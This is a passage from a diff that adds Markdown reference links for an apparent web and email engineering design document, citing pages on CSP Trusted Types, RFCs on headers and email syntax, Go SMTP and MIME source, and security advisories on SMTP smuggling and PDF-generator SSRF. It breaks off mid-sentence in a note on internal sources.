+[tt-support]: https://www.uriports.com/blog/csp-trusted-types/
+[tt-webdev]: https://web.dev/articles/trusted-types
+[mdn-bdi]: https://developer.mozilla.org/en-US/docs/Web/HTML/Element/bdi
+[mdn-csp-sandbox]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox
+[rfc6266]: https://www.rfc-editor.org/rfc/rfc6266
+[rfc8187]: https://www.rfc-editor.org/rfc/rfc8187
+[rfc5322]: https://www.rfc-editor.org/rfc/rfc5322#section-2.1.1
+[go-smtp-src]: https://github.com/golang/go/blob/master/src/net/smtp/smtp.go
+[go-mime-src]: https://github.com/golang/go/blob/master/src/mime/encodedword.go
+[smtp-smuggling]: https://cert.europa.eu/publications/security-advisories/2023-098/
+[pdf-ssrf]: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators
 
 Reference-style links above render inline wherever cited. Internal sources: `ad-technical-feasibility.md`
 §2.2, §2.5, §2.7; `.claude/skills/ad-engineering/` (gotchas, `reference/attributes.md`,
